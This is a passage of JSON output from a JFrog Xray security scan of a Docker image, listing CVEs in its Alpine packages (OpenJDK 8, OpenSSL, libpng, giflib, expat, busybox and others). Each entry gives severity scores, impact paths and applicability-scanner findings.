                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21294",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-413837",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Sound).  Supported versions that are affected are Oracle Java SE: 8u351, 8u351-perf, 11.0.17, 17.0.5, 19.0.1; Oracle GraalVM Enterprise Edition: 20.3.8, 21.3.4 and  22.3.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Sound).  Supported versions that are affected are Oracle Java SE: 8u351, 8u351-perf, 11.0.17, 17.0.5, 19.0.1; Oracle GraalVM Enterprise Edition: 20.3.8, 21.3.4 and  22.3.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-21843",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2023-01-19T00:00:00.569Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-21843",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-515312",
                    "summary": "Issue summary: The AES-XTS cipher decryption implementation for 64 bit ARM\nplatform contains a bug that could cause it to read past the input buffer,\nleading to a crash.\n\nImpact summary: Applications that use the AES-XTS algorithm on the 64 bit ARM\nplatform can crash in rare circumstances. The AES-XTS algorithm is usually\nused for disk encryption.\n\nThe AES-XTS cipher decryption implementation for 64 bit ARM platform will read\npast the end of the ciphertext buffer if the ciphertext size is 4 mod 5 in 16\nbyte blocks, e.g. 144 bytes or 1024 bytes. If the memory after the ciphertext\nbuffer is unmapped, this will trigger a crash which results in a denial of\nservice.\n\nIf an attacker can control the size and location of the ciphertext buffer\nbeing decrypted by an application using AES-XTS on 64 bit ARM, the\napplication is affected. This is fairly unlikely making this issue\na Low severity one.",
                    "description": "Issue summary: The AES-XTS cipher decryption implementation for 64 bit ARM\nplatform contains a bug that could cause it to read past the input buffer,\nleading to a crash.\n\nImpact summary: Applications that use the AES-XTS algorithm on the 64 bit ARM\nplatform can crash in rare circumstances. The AES-XTS algorithm is usually\nused for disk encryption.\n\nThe AES-XTS cipher decryption implementation for 64 bit ARM platform will read\npast the end of the ciphertext buffer if the ciphertext size is 4 mod 5 in 16\nbyte blocks, e.g. 144 bytes or 1024 bytes. If the memory after the ciphertext\nbuffer is unmapped, this will trigger a crash which results in a denial of\nservice.\n\nIf an attacker can control the size and location of the ciphertext buffer\nbeing decrypted by an application using AES-XTS on 64 bit ARM, the\napplication is affected. This is fairly unlikely making this issue\na Low severity one.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-1255",
                            "cwe": [
                                "CWE-125"
                            ],
                            "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2023-04-21T00:00:00.080Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "extended_information": {
                        "short_description": "An out-of-bounds read in OpenSSL 3.x may lead to denial of service in 64 bit ARM platforms when decrypting AES-XTS cipher data.",
                        "full_description": "OpenSSL is an open-source cryptographic library and toolset that provides a wide range of protocol supported and functions for secure communication, data encryption, digital certificates, and other cryptographic operations, widely used in various software applications and systems.\n[AES-XTS](https://www.cast-inc.com/security/encryption-primitives/aes-xts) is a mode of operation for the AES symmetric encryption algorithm designed explicitly for encrypting data on storage devices. It combines the XEX construction and the Tweakable Block Cipher concept to provide confidentiality and data integrity.\n\nA bug was identified in the OpenSSL decryption implementation of the AES-XTS cipher for 64-bit ARM systems, which, when triggered, could result in a crash due to reading beyond the input buffer if the overflow memory is not mapped.\n\nThe ciphertext length must be `4 modulu 5`, meaning a size that leaves a remainder of 4 when divided by 5.\nFor example: 154 bytes, 1024 bytes.\n\nThis issue only affects 64-bit ARM systems (`aarch64`).",
                        "jfrog_research_severity": "Low",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                                "description": "No PoC exists that triggers the issue and exploitation requires a solid understanding of cryptography principles and techniques.",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The issue only applies to 64-bit ARM systems (`aarch64`) and for applications that use `AES-XTS`.",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The attacker must control the buffer size of the ciphertext being decrypted, which is highly unlikely.",
                                "is_positive": true
                            },
                            {
                                "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                                "description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-1255",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-666471",
                    "summary": "png_create_info_struct in png.c in libpng 1.6.36 has a memory leak, as demonstrated by pngcp. NOTE: a third party has stated \"I don't think it is libpng's job to free this buffer.",
                    "description": "png_create_info_struct in png.c in libpng 1.6.36 has a memory leak, as demonstrated by pngcp. NOTE: a third party has stated \"I don't think it is libpng's job to free this buffer.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2019-6129",
                            "cwe": [
                                "CWE-401"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "6.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2025-01-14T00:00:00.926Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libpng:1.6.37-r1"
                    ],
                    "extended_information": {
                        "short_description": "A memory leak in libpng can lead to unspecified impact.",
                        "full_description": "[libpng](http://www.libpng.org/pub/png/libpng.html) is the official PNG reference library. It supports almost all PNG features, is extensible, and has been extensively tested for over 23 years.\n\npng_create_info_struct in png.c in libpng 1.6.36 has a memory leak, as demonstrated by pngcp.\n\nEven though a memory exhaustion can cause a denial of service in theory, in practice the conditions are highly unlikely and would require a very specific payload.\n\nA [discussion on github](https://github.com/glennrp/libpng/issues/269) suggests that \"the memory is leaked during abort(), so in the vast majority of cases there's no leak at all\".\n\nAlso in the same discussion, it is suggested that the leaked buffer should be freed by pngcp (the code using the library), not libpng itself.",
                        "jfrog_research_severity": "Low",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue has been disputed by the vendor",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Possible DoS",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2019-6129",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-228872",
                    "summary": "A memory leak (out-of-memory) in gif2rgb in util/gif2rgb.c in giflib 5.1.4 allows remote attackers trigger an out of memory exception or denial of service via a gif format file.",
                    "description": "A memory leak (out-of-memory) in gif2rgb in util/gif2rgb.c in giflib 5.1.4 allows remote attackers trigger an out of memory exception or denial of service via a gif format file.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-40633",
                            "cwe": [
                                "CWE-401"
                            ],
                            "cvss_v2": "5.1/CVSS:2.0/AV:N/AC:H/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-06-15T00:00:00.612Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:giflib:5.1.9-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:giflib:5.1.9-r0",
                            "cve_id": "CVE-2021-40633",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the <code>gif2rgb</code> utility exists and if it is executed in a script.</p>",
                            "evidence": null,
                            "info": "Gif2Rgb's binary or usage is not found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:giflib:5.1.9-r0",
                            "vulnerability_id": "CVE-2021-40633",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-253158",
                    "summary": "In gcc, a crafted input source file could cause g++ to crash during compilation when provided certain optimization flags. The problem resides in the ipcp_store_vr_results function in gcc/ipa-cp.c.",
                    "description": "In gcc, a crafted input source file could cause g++ to crash during compilation when provided certain optimization flags. The problem resides in the ipcp_store_vr_results function in gcc/ipa-cp.c.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-35537",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-09-01T00:00:00.732Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libgcc:8.3.0-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libstdc++:8.3.0-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-35537",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-677817",
                    "summary": "Thunderbird versions prior to 91.3.0 are vulnerable to the heap overflow described in CVE-2021-43527 when processing S/MIME messages. Thunderbird versions 91.3.0 and later will not call the vulnerable code when processing S/MIME messages that contain certificates with DER-encoded DSA or RSA-PSS signatures.",
                    "description": "Thunderbird versions prior to 91.3.0 are vulnerable to the heap overflow described in CVE-2021-43527 when processing S/MIME messages. Thunderbird versions 91.3.0 and later will not call the vulnerable code when processing S/MIME messages that contain certificates with DER-encoded DSA or RSA-PSS signatures.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-43529",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2025-03-19T00:00:00.059Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:nss:3.44.3-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-43529",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-198321",
                    "summary": "xmltok_impl.c in Expat (aka libexpat) before 2.4.5 lacks certain validation of encoding, such as checks for whether a UTF-8 character is valid in a certain context.",
                    "description": "xmltok_impl.c in Expat (aka libexpat) before 2.4.5 lacks certain validation of encoding, such as checks for whether a UTF-8 character is valid in a certain context.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-25235",
                            "cwe": [
                                "CWE-116"
                            ],
                            "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-02-17T00:00:00.440Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2022-25235",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2022-25235",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-514983",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and  22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via TLS to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and  22.3.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via TLS to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-21930",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
                        }
                    ],
                    "created": "2023-04-19T00:00:00.322Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "cve_id": "CVE-2023-21930",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable SSL functionality is in use, by checking whether any of the following classes are instantiated -</p>\n<ul>\n<li><code>SSLSocketFactory</code></li>\n<li><code>SSLServerSocketFactory</code></li>\n</ul>",
                            "evidence": null,
                            "info": "The vulnerable class SSLServerSocketFactory is never instantiated",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "cve_id": "CVE-2023-21930",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable SSL functionality is in use, by checking whether any of the following classes are instantiated -</p>\n<ul>\n<li><code>SSLSocketFactory</code></li>\n<li><code>SSLServerSocketFactory</code></li>\n</ul>",
                            "evidence": null,
                            "info": "The vulnerable class SSLServerSocketFactory is never instantiated",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "cve_id": "CVE-2023-21930",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable SSL functionality is in use, by checking whether any of the following classes are instantiated -</p>\n<ul>\n<li><code>SSLSocketFactory</code></li>\n<li><code>SSLServerSocketFactory</code></li>\n</ul>",
                            "evidence": null,
                            "info": "The vulnerable class SSLServerSocketFactory is never instantiated",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "vulnerability_id": "CVE-2023-21930",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "vulnerability_id": "CVE-2023-21930",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "vulnerability_id": "CVE-2023-21930",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-526071",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u371, 8u371-perf, 11.0.19, 17.0.7, 20.0.1; Oracle GraalVM Enterprise Edition: 20.3.10, 21.3.6, 22.3.2; Oracle GraalVM for JDK: 17.0.7 and  20.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK.  Successful attacks of this vulnerability can result in  unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u371, 8u371-perf, 11.0.19, 17.0.7, 20.0.1; Oracle GraalVM Enterprise Edition: 20.3.10, 21.3.6, 22.3.2; Oracle GraalVM for JDK: 17.0.7 and  20.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK.  Successful attacks of this vulnerability can result in  unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition, Oracle GraalVM for JDK accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-22045",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
                        }
                    ],
                    "created": "2023-07-19T00:00:00.424Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-22045",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-190228",
                    "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_s function",
                    "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_s function",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-42382",
                            "cwe": [
                                "CWE-416"
                            ],
